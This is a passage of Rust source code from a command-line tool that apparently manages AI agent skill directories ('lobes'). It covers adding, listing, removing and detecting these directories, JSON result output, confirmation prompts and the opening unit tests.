        if out.json {
            frozen_keys.sort();
            let mut result = MutationResult::new(
                "lobe-add",
                &path_str,
                if copied == 0 { "no-op" } else { "snapshot" },
            );
            result.count = Some(copied);
            result.installed = frozen_keys;
            return print_json(&result);
        }
        if copied == 0 {
            println!("note: no installed items to snapshot into {path_str}");
        } else {
            println!("wrote {copied} frozen skill(s) to {path_str}");
            // Advisory: if the target is not inside a git repo, suggest committing.
            let is_git = lobe.path.join(".git").exists()
                || lobe.path.parent().is_some_and(|p| p.join(".git").exists());
            if !is_git {
                println!(
                    "note: {path_str} does not appear to be a git repo; \
                     commit the frozen copies to version-control them"
                );
            }
        }
        return Ok(());
    }

    // Managed (non-snapshot) path: register in config, backfill, gitignore note.
    //
    // spec: HARN-15 -- create the resolved lobe path on disk immediately, before
    // it is recorded in config. A preset base (e.g. `--preset gemini` before
    // Gemini CLI is installed) may not exist yet; the whole point of registering
    // a lobe ahead of its harness is that the lobe becomes reachable (STO-56) the
    // moment it is registered, so the HARN-17 backfill lands, the HARN-11
    // gitignore note names a real directory, and `introspect --fix` does not
    // treat it as vanished (HARN-13) and prune it on the next run. This does NOT
    // relax `resolve_lobe`'s existing `LobeBaseMissing` guard on an EXPLICIT base
    // (HARN-10): a base directory the user mistyped is still refused above,
    // before this point is ever reached.
    crate::paths::mkdir_p(&lobe.path)?;
    paths.ensure_config()?;
    let entry = crate::config::LobeEntry {
        path: path_str.clone(),
        kinds: lobe.kinds.clone(),
    };
    let mut cfg = Config::load(paths)?;
    if cfg.lobes.iter().any(|e| e.path() == path_str) {
        if out.json {
            return print_json(&MutationResult::new("lobe-add", &path_str, "no-op"));
        }
        println!("{} lobe already configured: {path_str}", out.available());
        return Ok(());
    }
    // spec: HARN-9 -- preserve the implicit claude_home default when this is
    // the first explicit lobe. Without this the default is silently replaced
    // by the configured list and new installs no longer reach ~/.claude.
    if cfg.lobes.is_empty() {
        let ch = paths.claude_home.to_string_lossy().into_owned();
        if ch.as_str() != path_str {
            cfg.lobes.push(crate::config::LobeEntry::bare(&ch));
        }
    }
    cfg.lobes.push(entry.clone());
    cfg.save(paths)?;

    // Determine if this is a project-scoped lobe for gitignore guidance.
    let is_project_scope =
        preset_opt.is_some_and(|p| p.scope == Scope::Project) || subdir.is_some();

    if out.json {
        backfill_new_lobes(paths, std::slice::from_ref(&lobe), force)?;
        return print_json(&MutationResult::new("lobe-add", &path_str, "added"));
    }
    // Human output: print the added lobe, then gitignore guidance for project lobes.
    match preset_opt {
        Some(p) => {
            println!("{} added {} lobe {}", out.ok(), p.name, format_lobe(&entry));
        }
        None => {
            println!("{} added lobe {}", out.ok(), format_lobe(&entry));
        }
    }
    if is_project_scope {
        let skills_dir = lobe.path.join("skills");
        println!(
            "note: {}/  contains symlinks into ~/.mind/store; \
             add it to .gitignore so the symlinks are not committed",
            skills_dir.display()
        );
    }
    backfill_new_lobes(paths, std::slice::from_ref(&lobe), force)?;
    Ok(())
}

/// `mind config lobes add <path>` — add an agent home by path.
pub fn lobe_add(paths: &Paths, path: &str, yes: bool) -> Result<()> {
    lobe_add_resolved(paths, Some(path), None, None, false, false, yes)
}

/// `mind config lobes list` — list configured agent homes, with each lobe's
/// `kinds` filter when it carries one (HARN-1).
pub fn lobe_list(paths: &Paths) -> Result<()> {
    let out = crate::render::ctx();
    paths.ensure_config()?;
    let cfg = Config::load(paths)?;
    if out.json {
        if cfg.lobes.is_empty() {
            let default = crate::config::LobeEntry::bare(paths.claude_home.display().to_string());
            return print_json(&serde_json::json!({ "lobes": [default] }));
        }
        return print_json(&serde_json::json!({ "lobes": cfg.lobes }));
    }
    if cfg.lobes.is_empty() {
        println!("{}  (default)", paths.claude_home.display());
    } else {
        for e in &cfg.lobes {
            println!("{}", format_lobe(e));
        }
    }
    // POL-40: under a managed lobe lock, `Paths::agent_homes` ignores
    // $MIND_AGENT_HOMES, so the override note would be false. Suppress it when a
    // policy is in effect and lobes are locked; otherwise behavior is unchanged.
    let lobes_locked = matches!(Policy::load()?, Some(p) if p.lobes_lock());
    if show_override_note(std::env::var_os("MIND_AGENT_HOMES").is_some(), lobes_locked) {
        println!("note: MIND_AGENT_HOMES is set and overrides the above");
    }
    Ok(())
}

/// POL-40: the `config lobes list` override note is shown only when
/// `$MIND_AGENT_HOMES` is set AND it actually takes effect. Under a managed lobe
/// lock `Paths::agent_homes` ignores the env var, so the note would be false;
/// suppress it.
fn show_override_note(env_set: bool, lobes_locked: bool) -> bool {
    env_set && !lobes_locked
}

/// `mind config lobes remove <path> [--snapshot]` — drop an agent home.
///
/// With `--snapshot` (HARN-12): for each manifest item whose recorded link is
/// confined under the lobe path, replace the symlink with a frozen real-file copy
/// of the store content, strip the link from the manifest, then drop the config
/// entry.
pub fn lobe_remove(paths: &Paths, path: &str, snapshot: bool) -> Result<()> {
    let out = crate::render::ctx();
    // POL-40: a lobe lock pins the effective agent homes; refuse and change
    // nothing.
    if let Some(policy) = Policy::load()?
        && policy.lobes_lock()
    {
        return Err(lobes_locked_error("remove"));
    }
    paths.ensure_config()?;
    let mut cfg = Config::load(paths)?;
    let before = cfg.lobes.len();
    cfg.lobes.retain(|e| e.path() != path);
    if cfg.lobes.len() == before {
        return Err(MindError::UnknownLobe {
            path: path.to_string(),
        });
    }

    let mut frozen_count: Option<usize> = None;
    if snapshot {
        // HARN-12: freeze symlinks confined under the lobe before dropping the entry.
        let lobe_path = std::path::Path::new(path);
        let mut manifest = Manifest::load(paths)?;
        let mut frozen = 0usize;
        for item in manifest.items.values_mut() {
            let mut new_links = Vec::new();
            for link_str in &item.links {
                let link = std::path::Path::new(link_str);
                // Only process links confined under this lobe.
                if !link.starts_with(lobe_path) {
                    new_links.push(link_str.clone());
                    continue;
                }
                // Replace the symlink with a frozen real-file copy.
                let store_src = paths.mind_home.join(&item.store);
                // Remove the existing symlink (or whatever is there).
                if std::fs::symlink_metadata(link).is_ok() {
                    if link.is_dir() && !link.is_symlink() {
                        std::fs::remove_dir_all(link).map_err(|e| MindError::io(link, e))?;
                    } else {
                        std::fs::remove_file(link).map_err(|e| MindError::io(link, e))?;
                    }
                }
                install::copy_recursive(&store_src, link)?;
                frozen += 1;
                // The link path stays the same (now a real file/dir); keep it
                // in the manifest as a record of the on-disk location, but it
                // is no longer a mind-managed symlink. We strip it so a later
                // `forget` does not try to remove it (the user owns the copy).
                // (HARN-12: strip from manifest.)
            }
            item.links = new_links;
        }
        manifest.save(paths)?;
        frozen_count = Some(frozen);
        if !out.json {
            println!("frozen {frozen} link(s) in {path} to real files");
        }
    }

    cfg.save(paths)?;
    if out.json {
        // spec: HARN-14 -- a plain remove is `removed`; a `--snapshot` detach is
        // `detached` with `count` = the number of links frozen.
        let mut result = MutationResult::new(
            "lobe-remove",
            path,
            if frozen_count.is_some() {
                "detached"
            } else {
                "removed"
            },
        );
        result.count = frozen_count;
        return print_json(&result);
    }
    println!("{} removed lobe {path}", out.ok());
    Ok(())
}

/// `mind config lobes detect` — detect installed agent homes (lobes) and offer
/// to add their presets (HARN-5). Global presets (gemini, codex, universal) are
/// offered for auto-add with confirmation or `--yes`. Project-scoped presets
/// (windsurf) are never auto-added; detection prints guidance to run
/// `mind link-project [--preset <name>]` inside a project directory instead.
/// Honors the POL-40 lobe lock and dedups against the already-configured lobes.
pub fn lobe_detect(paths: &Paths, yes: bool) -> Result<()> {
    use crate::paths::{Scope, lookup_preset};

    let out = crate::render::ctx();
    // POL-40: refuse under a lobe lock before reporting or writing anything.
    if let Some(policy) = Policy::load()?
        && policy.lobes_lock()
    {
        return Err(lobes_locked_error("detect"));
    }
    paths.ensure_config()?;
    let mut cfg = Config::load(paths)?;
    let configured: HashSet<String> = cfg.lobes.iter().map(|e| e.path().to_string()).collect();

    // Dedup detected lobes against the configured set and against each other
    // (codex and universal can both point at ~/.agents).
    let detected = Paths::detect_homes()?;
    let mut seen: HashSet<std::path::PathBuf> = HashSet::new();
    let mut candidates: Vec<(&'static str, crate::config::LobeEntry)> = Vec::new();
    for (name, lobe) in detected {
        let path = lobe.path.to_string_lossy().into_owned();
        if configured.contains(&path) || !seen.insert(lobe.path.clone()) {
            continue;
        }
        candidates.push((
            name,
            crate::config::LobeEntry {
                path,
                kinds: lobe.kinds.clone(),
            },
        ));
    }

    // Split candidates: global presets are offered for auto-add; project-scoped
    // presets (windsurf) get guidance only -- the project dir is not known here.
    // spec: HARN-5
    type LobePair = (&'static str, crate::config::LobeEntry);
    let (global_candidates, project_candidates): (Vec<LobePair>, Vec<LobePair>) =
        candidates.into_iter().partition(|(name, _)| {
            lookup_preset(name)
                .ok()
                .is_none_or(|p| p.scope == Scope::Global)
        });

    // Decide whether to mutate global candidates. With --yes, add
    // unconditionally. Without it, a TTY gets a confirm prompt; a non-TTY
    // reports only (HARN-5).
    let do_add = if global_candidates.is_empty() {
        false
    } else if yes {
        true
    } else if crate::hook::is_tty() {
        let names: Vec<String> = global_candidates
            .iter()
            .map(|(n, e)| format!("{n} ({})", format_lobe(e)))
            .collect();
        confirm(&format!("add detected lobe(s): {}?", names.join(", ")))?
    } else {
        false
    };

    if out.json {
        let detected_json: Vec<serde_json::Value> = global_candidates
            .iter()
            .chain(project_candidates.iter())
            .map(|(name, entry)| {
                let scope = lookup_preset(name)
                    .ok()
                    .map(|p| match p.scope {
                        Scope::Global => "global",
                        Scope::Project => "project",
                    })
                    .unwrap_or("global");
                serde_json::json!({
                    "preset": name,
                    "path": entry.path(),
                    "kinds": entry.kinds().map(|ks| {
                        ks.iter().map(|k| k.as_str()).collect::<Vec<_>>()
                    }),
                    "scope": scope,
                })
            })
            .collect();
        let guidance: Vec<String> = project_candidates
            .iter()
            .map(|(name, _)| {
                format!(
                    "run `mind link-project --preset {name}` inside a project \
                     directory to link skills there"
                )
            })
            .collect();
        if do_add {
            // spec: HARN-9
            if cfg.lobes.is_empty() {
                let ch = paths.claude_home.to_string_lossy().into_owned();
                if !global_candidates
                    .iter()
                    .any(|(_, e)| e.path() == ch.as_str())
                {
                    cfg.lobes.push(crate::config::LobeEntry::bare(&ch));
                }
            }
            for (_, entry) in &global_candidates {
                cfg.lobes.push(entry.clone());
            }
            cfg.save(paths)?;
            let new_lobes = candidates_to_lobes(&global_candidates);
            // HARN-17: unconditional backfill; no --force plumbing for `detect`,
            // so a foreign target is reported (never clobbered).
            backfill_new_lobes(paths, &new_lobes, false)?;
        }
        return print_json(&serde_json::json!({
            "action": "lobe-detect",
            "detected": detected_json,
            "added": do_add,
            "guidance": guidance,
        }));
    }

    if global_candidates.is_empty() && project_candidates.is_empty() {
        println!("{} no new agent homes (lobes) detected", out.bullet());
        return Ok(());
    }

    if do_add {
        // spec: HARN-9
        if cfg.lobes.is_empty() {
            let ch = paths.claude_home.to_string_lossy().into_owned();
            if !global_candidates
                .iter()
                .any(|(_, e)| e.path() == ch.as_str())
            {
                cfg.lobes.push(crate::config::LobeEntry::bare(&ch));
            }
        }
        for (name, entry) in &global_candidates {
            cfg.lobes.push(entry.clone());
            println!("{} added {name} lobe {}", out.ok(), format_lobe(entry));
        }
        cfg.save(paths)?;
        let new_lobes = candidates_to_lobes(&global_candidates);
        // HARN-17: unconditional backfill; no --force plumbing for `detect`, so a
        // foreign target is reported (never clobbered).
        backfill_new_lobes(paths, &new_lobes, false)?;
    } else if !global_candidates.is_empty() {
        println!("{} detected agent home(s) (lobes):", out.bullet());
        for (name, entry) in &global_candidates {
            println!("  {} {name}: {}", out.dim("·"), format_lobe(entry));
        }
        println!("re-run with --yes to add them");
    }

    // Project-scoped presets: always print guidance, never auto-add.
    for (name, _) in &project_candidates {
        println!(
            "{} detected {name}: run `mind link-project --preset {name}` \
             inside a project directory to link skills there",
            out.bullet()
        );
    }
    Ok(())
}

/// `mind completions <shell>` — write a shell completion script to stdout.
pub fn completions(shell: clap_complete::Shell) {
    use clap::CommandFactory;
    let mut cmd = crate::cli::Cli::command();
    clap_complete::generate(shell, &mut cmd, "mind", &mut std::io::stdout());
}

/// `mind man` — write the roff man pages to stdout: the top-level page, then
/// one page per visible subcommand, so the SUBCOMMANDS cross-references
/// (`mind-meld(1)`, ...) resolve within the same output instead of dangling.
// spec: CLI-121
pub fn man() -> Result<()> {
    use clap::CommandFactory;
    let mut out = Vec::new();
    let cmd = crate::cli::Cli::command();
    clap_mangen::Man::new(cmd.clone())
        .render(&mut out)
        .map_err(|e| MindError::io("<man>", e))?;
    for sub in cmd.get_subcommands() {
        if sub.is_hide_set() {
            continue;
        }
        // clap's Str only takes &'static str without its `string` feature;
        // leaking a handful of short page names once per `man` run is fine.
        let name: &'static str = Box::leak(format!("mind-{}", sub.get_name()).into_boxed_str());
        clap_mangen::Man::new(sub.clone().name(name))
            .render(&mut out)
            .map_err(|e| MindError::io("<man>", e))?;
    }
    std::io::stdout()
        .write_all(&out)
        .map_err(|e| MindError::io("<stdout>", e))
}

// --- helpers ---------------------------------------------------------------

/// Build the refusal error for a locked `config lobes <action>` (POL-40). The
/// effective agent homes are pinned by `[lobes].lock`, so the action changes
/// nothing.
fn lobes_locked_error(action: &str) -> MindError {
    MindError::LobesLocked {
        action: action.to_string(),
    }
}

/// A source entry that was skipped during meld or sync due to an auth failure
/// with `on-auth-failure.action = "skip"` (DSC-68, DSC-69).
#[derive(Serialize, Debug, PartialEq, Eq)]
pub(crate) struct SkippedEntry {
    source: String,
    reason: String,
}

/// Data returned by `meld()` so the dispatcher can combine it with the
/// post-meld install outcome into ONE JSON object (CLI-153, CLI-156).
pub(crate) struct MeldSummary {
    pub(crate) source_name: String,
    pub(crate) added: usize,
    pub(crate) skipped: Vec<SkippedEntry>,
}

/// The structured result a mutating verb emits under `--json` (CLI-153).
/// `action` is the verb, `target` the item/source ref it acted on, and `outcome`
/// a stable token (`installed|removed|melded|synced|upgraded|renamed|no-op|...`).
/// Optional fields are only serialized when a verb genuinely returns more (e.g.
/// `learn` fills `installed` with its closure keys; `sync` fills `count`).
#[derive(Serialize, Debug, PartialEq, Eq)]
struct MutationResult {
    // spec: CLI-168 - schema version; always 1.
    schema: u8,
    action: &'static str,
    target: String,
    outcome: &'static str,
    #[serde(skip_serializing_if = "Option::is_none")]
    count: Option<usize>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    installed: Vec<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    removed: Vec<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    skipped: Vec<SkippedEntry>,
    /// Count of items available to install but not yet installed (no `--yes` given).
    /// Only set for `meld` JSON results when items are pending (CLI-156).
    #[serde(skip_serializing_if = "Option::is_none")]
    pending_items: Option<usize>,
    /// The managed `kind:name` key after a successful absorb (ABS-11).
    #[serde(skip_serializing_if = "Option::is_none")]
    key: Option<String>,
}

impl MutationResult {
    /// A result with no optional fields populated.
    fn new(action: &'static str, target: &str, outcome: &'static str) -> Self {
        Self {
            schema: 1,
            action,
            target: target.to_string(),
            outcome,
            count: None,
            installed: Vec::new(),
            removed: Vec::new(),
            skipped: Vec::new(),
            pending_items: None,
            key: None,
        }
    }
}

/// True when the current output context wants machine JSON. A mutating verb gates
/// its prose on `!json_mode()` and emits a [`MutationResult`] when it is true.
fn json_mode() -> bool {
    crate::render::ctx().json
}

/// Emit a verb's JSON result (CLI-153).
///
/// When stdout is reserved (`--json` on a verb that answers with a document,
/// CLI-217) the document is RECORDED rather than printed: `main` writes the
/// last one recorded, once, to the preserved stdout. Every `print_json` call in
/// this module goes through here, so a nested verb invoked on another verb's
/// behalf (`meld`/`sync` -> `learn`) can no longer put a second document on
/// stdout, whatever the call site does. Outside that mode it is
/// `render::print_json` unchanged.
// spec: CLI-217
pub(crate) fn print_json<T: Serialize>(value: &T) -> Result<()> {
    if crate::json_stdout::is_reserved() {
        let s =
            serde_json::to_string_pretty(value).map_err(|e| MindError::json("json output", e))?;
        crate::json_stdout::record(s);
        return Ok(());
    }
    crate::render::print_json(value)
}

/// [`print_json`] for the `{"schema": 1, "items": [...]}` array envelope
/// (CLI-167), with the same CLI-217 recording behavior.
// spec: CLI-217
fn print_json_envelope<T: Serialize>(items: &[T]) -> Result<()> {
    if crate::json_stdout::is_reserved() {
        // Same envelope `render::print_json_envelope` builds, routed through the
        // recording emitter above instead of straight to stdout.
        #[derive(Serialize)]
        struct Envelope<'a, T: Serialize> {
            schema: u8,
            items: &'a [T],
        }
        return print_json(&Envelope { schema: 1, items });
    }
    crate::render::print_json_envelope(items)
}

/// A throwaway registry holding just one source, for catalog scans during meld.
pub(crate) fn single(source: &crate::source::Source) -> Registry {
    Registry {
        sources: vec![source.clone()],
    }
}

/// DSC-93: the resolved path of a `[discover].sources` entry that names a LOCAL
/// path which (a) does not exist and (b) lies inside mind's managed sources tree
/// (`<mind_home>/sources`), i.e. a relative curator entry DSC-92 resolved against
/// a cloned copy of that curator. `None` for every other entry: a remote spec, an
/// absolute local path outside the sources tree, or any path that actually
/// exists (including a sibling clone the same walk already created, which the
/// DSC-70 already-registered guard handles).
///
/// The predicate is deliberately structural rather than name-based: mind is the
/// only writer of the sources tree, and it never creates the sibling a curator's
/// `../x` would need, so a non-existent path there can only be a misresolved
/// relative reference -- no matching of the entry against other entries in the
/// walk is required, and identity (`host/owner/repo`), which the two readings
/// disagree on, is never consulted.
// spec: DSC-93
fn unresolvable_managed_local_entry(paths: &Paths, spec: &str) -> Option<std::path::PathBuf> {
    // The quiet parse: this is a classification, not a decision to clone, so the
    // CLI-215 shadowing note would be noise here (CLI-216).
    let parsed = crate::source::parse_spec_quiet(spec).ok()?;
    if parsed.host != "local" {
        return None;
    }
    let path = std::path::PathBuf::from(&parsed.url);
    (!path.exists() && path.starts_with(paths.sources_dir())).then_some(path)
}

/// Scan exactly ONE source, hard-failing on any scan error.
///
/// The counterpart to `catalog::scan(paths, &single(src))`, which routes through
/// the whole-registry walk and therefore inherits its CLI-213 degradation: a
/// `LinkedSourceGone` source is skipped with a stderr warning and the call
/// returns `Ok(vec![])`. That degradation exists so one dead source does not take
/// down a LISTING of every source; it is wrong for a caller that named a single
/// source and needs to know whether THAT source could be read, because an empty
/// result is indistinguishable from a healthy source with no items.
// spec: CLI-212 CLI-213
fn scan_one(paths: &Paths, source: &crate::source::Source) -> Result<Vec<CatalogItem>> {
    let mut items = Vec::new();
    catalog::scan_source(paths, source, &mut items)?;
    Ok(items)
}

/// Report a manifest-save failure that occurred while already unwinding from
/// another error (LIFE-48's double-failure outcome, CLI-232): the root cause
/// `e` is about to propagate, and persisting the manifest to record what
/// already happened on disk ALSO failed, so on-disk state may now not match
/// `manifest.json`.
///
/// Routed through `render::warn` rather than a bare `eprintln!` so the
/// message is sanitized (DSC-95 -- `se`'s Display can embed a source-
/// controlled path) and follows the same stdout/text vs stderr/json routing
/// as every other advisory line (CLI-217). It also drops the `error: `
/// prefix the bare `eprintln!` reused: `main.rs` already prints `error: {err}`
/// for the propagated root cause, so two lines both starting `error: ` read
/// as two candidates for "the" error rather than a root cause plus a
/// secondary complication. Names `mind introspect --fix` as the remedy.
// spec: CLI-232 LIFE-48
fn warn_manifest_save_also_failed(se: &MindError) {
    crate::render::warn(format!(
        "also failed to persist the manifest: {}; on-disk state may not match \
         manifest.json -- run `mind introspect --fix` to reconcile",
        strip_ansi(&se.to_string())
    ));
}

/// Build the `action` text for a `ConfirmationRequired` raised because
/// `--json` is non-interactive (LIFE-45), as opposed to stdin merely not
/// being a TTY. The variant's fixed suffix ("re-run with --yes (or in an
/// interactive terminal)") is misleading for a `--json` caller: retrying in
/// a real terminal changes nothing, because `--json` disables interactive
/// confirmation unconditionally regardless of the TTY. Route through this so
/// the action text names the only remedy that actually applies.
// spec: CLI-232
fn json_confirmation_action(base: impl std::fmt::Display, json: bool) -> String {
    if json {
        format!("{base} (--json is always non-interactive; --yes is the only way to proceed)")
    } else {
        base.to_string()
    }
}

/// Build the note naming an upgrade pass's matched sources when the scope
/// spans more than one source (CLI-233; extended from `sync <filter>
/// --upgrade`-only to `upgrade <item>` too by CLI-234). `names` is the union
/// of every scoping mechanism in play, computed once by the caller
/// (`upgrade_inner_scoped`'s `scope_names`); a filter (unlike `unmeld`'s/
/// `upgrade`'s ref-style SOURCE selection, CLI-20) intentionally allows more
/// than one match, so a name like `mind sync skills --upgrade` or `mind
/// upgrade 'suffix#*'` can silently widen to upgrading -- and re-running the
/// install hook of (HOOK-11) -- every source the filter happened to match,
/// while reading as if it named one.
///
/// `filter_desc`, when given, is the raw filter TEXT that produced the match
/// (the `sync` selector string or the `upgrade` item-ref string, M19),
/// echoed so the disclosure names what did the matching, not just how many
/// sources it hit.
///
/// spec: CLI-235 -- this now fires BEFORE `pending` is computed (hoisted
/// above `rerun_source_hooks`, M1), so it can no longer claim to name only
/// the sources that end up contributing a pending upgrade: it says plainly
/// that every matched source is in scope for this pass, present tense (not
/// "possibly re-running", which read as a future warning for a hook re-run
/// that, before the M1 fix, had already happened by the time this printed).
///
/// `None` when `names` has zero or one entries: an unscoped `--upgrade` pass
/// (bare `mind upgrade`, or `sync`/`upgrade` with no filter) and a
/// single-match filter both leave the confirmation exactly as it was before
/// CLI-233 -- a single match already reads as naming that one source, so
/// growing the disclosure there would be noise, not signal.
// spec: CLI-233 CLI-234 CLI-235
fn multi_source_upgrade_note(names: &[String], filter_desc: Option<&str>) -> Option<String> {
    if names.len() <= 1 {
        return None;
    }
    let mut sanitized: Vec<String> = names.iter().map(|n| strip_ansi(n)).collect();
    sanitized.sort();
    // spec: M19 -- end with the narrowing remedy (a longer suffix, or the
    // full `host/owner/repo` identity), matching every other confirmation in
    // this module that states a real next step rather than just a warning.
    let scope = match filter_desc {
        Some(f) => format!("the filter \"{}\"", strip_ansi(f)),
        None => "this upgrade's scope".to_string(),
    };
    Some(format!(
        "{scope} matched {} sources; every matched source's items are in scope for this pass, and its install hook may be re-run: {}. Narrow with a longer suffix, or the full host/owner/repo identity, to target fewer.",
        sanitized.len(),
        sanitized.join(", "),
    ))
}

/// First 8 chars of a hash/commit, for compact display.
fn short(s: &str) -> String {
    if s.is_empty() {
        "-".to_string()
    } else {
        s.chars().take(8).collect()
    }
}

/// One-line summary for list views: first sentence or `max` chars, whichever is
/// shorter. The full text stays available via `recall <item>`.
fn summary(desc: Option<&str>, max: usize) -> String {
    let Some(d) = desc else { return String::new() };
    let first = d.split(". ").next().unwrap_or(d).trim_end_matches('.');
    if first.chars().count() <= max {
        return first.to_string();
    }
    let cut: String = first.chars().take(max.saturating_sub(1)).collect();
    format!("{}...", cut.trim_end())
}

/// Print `prompt` and read one line from stdin (trimmed by the caller). EOF
/// yields an empty string. Used for free-form answers like the prefix prompt
/// (CLI-24), where `[y/N]` is not enough.
fn prompt_line(prompt: &str) -> Result<String> {
    // spec: DSC-95 -- a prompt built from a source-controlled name (the
    // meld prefix preview, CLI-24) can carry ANSI/control/bidi bytes; sanitize
    // before it reaches the terminal.
    let prompt = crate::sanitize::strip_ansi(prompt);
    print!("{prompt}");
    let _ = std::io::stdout().flush();
    let mut line = String::new();
    if std::io::stdin()
        .read_line(&mut line)
        .map_err(|e| MindError::io("<stdin>", e))?
        == 0
    {
        return Ok(String::new()); // EOF -> empty (accept the declared prefix)
    }
    Ok(line)
}

/// Resolve a yes/no reply. An explicit `y`/`yes` or `n`/`no` (any case, trimmed)
/// wins; an empty line or any unrecognized reply takes `default_yes`.
fn parse_confirm(input: &str, default_yes: bool) -> bool {
    match input.trim().to_ascii_lowercase().as_str() {
        "y" | "yes" => true,
        "n" | "no" => false,
        _ => default_yes,
    }
}

/// Print `prompt {hint}`, read one line from stdin, and resolve it against
/// `default_yes`. EOF (no input) is always No.
fn read_confirm(prompt: &str, hint: &str, default_yes: bool) -> Result<bool> {
    // spec: DSC-95 -- the single chokepoint every `confirm`/
    // `confirm_default_yes` call routes through; sanitize here so a
    // source-controlled name baked into a prompt string cannot carry ANSI/
    // control/bidi bytes to the terminal.
    let prompt = crate::sanitize::strip_ansi(prompt);
    print!("\n{prompt} {hint} ");
    let _ = std::io::stdout().flush();
    let mut line = String::new();
    let stdin = std::io::stdin();
    if stdin
        .read_line(&mut line)
        .map_err(|e| MindError::io("<stdin>", e))?
        == 0
    {
        return Ok(false); // EOF (no input) -> treat as No
    }
    Ok(parse_confirm(&line, default_yes))
}

/// Prompt `[y/N]` on the terminal; default No.
pub(crate) fn confirm(prompt: &str) -> Result<bool> {
    read_confirm(prompt, "[y/N]", false)
}

/// Like `confirm` but defaulting to yes (`[Y/n]`): a bare Enter (or any reply that
/// is not an explicit no) confirms. Used where the affirmative is the expected
/// path and the action is reversible (the meld install-items prompt, CLI-23).
pub(crate) fn confirm_default_yes(prompt: &str) -> Result<bool> {
    read_confirm(prompt, "[Y/n]", true)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::error::ItemKind;
    use crate::manifest::InstalledItem;
    // The env lock is crate-wide, not per-module: `std::env::set_var` soundness
    // is a process-wide property, and these tests share a binary with the
    // env-mutating tests in `paths.rs` and `selfupdate.rs`.
    use crate::paths::ENV_LOCK;
    use std::path::PathBuf;
    use std::sync::atomic::{AtomicU32, Ordering};

    static COUNTER: AtomicU32 = AtomicU32::new(0);

    fn link_skill(name: &str, requires: Vec<String>) -> CatalogItem {
        CatalogItem {
            kind: ItemKind::Skill,
            name: name.to_string(),
            source: "local/test/repo#skills/review".to_string(),
            prefix: None,
            path: PathBuf::from("/nonexistent"),
            description: None,
            link_rel: None,
            bin: None,
            build: None,
            requires,
            expand: Vec::new(),
            hooks: Vec::new(),
            ignore: None,
        }
    }

    /// Which `requires` entries a single-item link instance drops, and which
    /// it keeps so install still reports their specific DEP-7 cause.
    // spec: LNK-18
    #[test]
    fn link_drops_only_the_entries_a_single_item_catalog_cannot_satisfy() {
        let item = link_skill("review", vec![]);
        // Unsatisfiable: well-formed, intra-source, names another item.
        assert!(!requires_resolves_alone("agent:dev", &item));
        assert!(!requires_resolves_alone("dev", &item));
        // The item's own name resolves (a self-require, DEP-5).
        assert!(requires_resolves_alone("review", &item));
        assert!(requires_resolves_alone("skill:review", &item));
        // Its own name under the WRONG kind is still a miss.
        assert!(!requires_resolves_alone("agent:review", &item));
        // Kept, so install raises the specific DEP-7 cause instead of a warning:
        // a source-qualified entry (CrossSource) and a malformed one (InvalidRef).
        assert!(requires_resolves_alone("owner/repo#agent:dev", &item));
        assert!(requires_resolves_alone("skill:", &item));
    }

    fn catalog_skill(name: &str, source: &str, prefix: Option<&str>) -> CatalogItem {
        CatalogItem {
            prefix: prefix.map(str::to_string),
            source: source.to_string(),
            ..link_skill(name, vec![])
        }
    }

    /// A [`LearnTarget`] for readable assertions.
    fn target(source: &str, key: &str) -> LearnTarget {
        LearnTarget {
            source: source.to_string(),
            key: key.to_string(),
        }
    }

    /// The `<source>#<key>` spelling mind prints for the user to paste survives
    /// the round trip back through `learn`'s own ref grammar.
    // spec: CLI-236 DSC-95
    #[test]
    fn learn_target_display_escapes_a_key_the_user_would_paste_back() {
        let items = vec![
            catalog_skill("pdf[x]", "s", None),
            catalog_skill("pdfx", "s", None),
        ];
        let target = target("s", "skill:pdf[x]");
        let printed = target.display();
        // mind never re-parses this, but the user pastes it into `mind learn`,
        // which DOES read the name half as a glob. Unescaped it would select
        // the wrong item, exactly as the `--learn` pattern would.
        let parsed = crate::resolve::parse_item_ref(&printed).expect("a valid ref");
        let selected = crate::resolve::select(&items, &parsed);
        assert_eq!(
            selected
                .iter()
                .map(|it| it.name.as_str())
                .collect::<Vec<_>>(),
            vec!["pdf[x]"],
            "the printed ref must select the item it names: {printed}"
        );
        // And the unescaped spelling really would have selected the other one.
        let raw = format!("{}#{}", target.source, target.key);
        let raw_parsed = crate::resolve::parse_item_ref(&raw).expect("a valid ref");
        assert_eq!(
            crate::resolve::select(&items, &raw_parsed)
                .iter()
                .map(|it| it.name.as_str())
                .collect::<Vec<_>>(),
            vec!["pdfx"],
            "the unescaped spelling selects the wrong item, which is why it is escaped"
        );
    }

    /// A `--learn` pattern matches the bare name as well as the effective one,
    /// is scoped to the melded source, and yields exact kind-qualified
    /// identities.
    // spec: CLI-236
    #[test]
    fn learn_pattern_matches_bare_and_effective_names_within_the_source() {
        let items = vec![
            catalog_skill("review", "github.com/o/r", Some("jk")),
            catalog_skill("extra", "github.com/o/r", Some("jk")),
            catalog_skill("review", "github.com/other/r", None),
        ];
        // The bare name resolves even though the item installs as `jk:review`,
        // which is what a first-time melder can actually type.
        assert_eq!(
            learn_pattern_targets(&items, "github.com/o/r", "review").unwrap(),
            vec![target("github.com/o/r", "skill:jk:review")]
        );
        // So does the effective name.
        assert_eq!(
            learn_pattern_targets(&items, "github.com/o/r", "jk:review").unwrap(),
            vec![target("github.com/o/r", "skill:jk:review")]
        );
        // A glob matches either reading, and never reaches another source.
        assert_eq!(
            learn_pattern_targets(&items, "github.com/o/r", "*e*").unwrap(),
            vec![
                target("github.com/o/r", "skill:jk:review"),
                target("github.com/o/r", "skill:jk:extra"),
            ]
        );
        // A kind qualifier that does not match filters everything out.
        assert!(matches!(
            learn_pattern_targets(&items, "github.com/o/r", "agent:review"),
            Err(MindError::LearnPatternNoMatch { .. })
        ));
    }

    /// A matched selection resolves back to the SAME catalog item, whatever the
    /// item is named. The selection is carried as an identity, so the two
    /// characters that used to break the round trip -- a glob metacharacter
    /// (re-read as a pattern) and a `#` (re-split into the wrong source) --
    /// resolve exactly.
    // spec: CLI-236
    #[test]
    fn a_matched_selection_round_trips_to_the_same_item() {
        let items = vec![
            catalog_skill("pdf[x]", "s", None),
            catalog_skill("pdfx", "s", None),
            catalog_skill("x#skill:review", "s", None),
            catalog_skill("review", "s", None),
        ];
        // A glob-metacharacter name, selected by the escaped literal pattern
        // the LNK-18 remedy emits, resolves back to itself and not to its
        // near-twin.
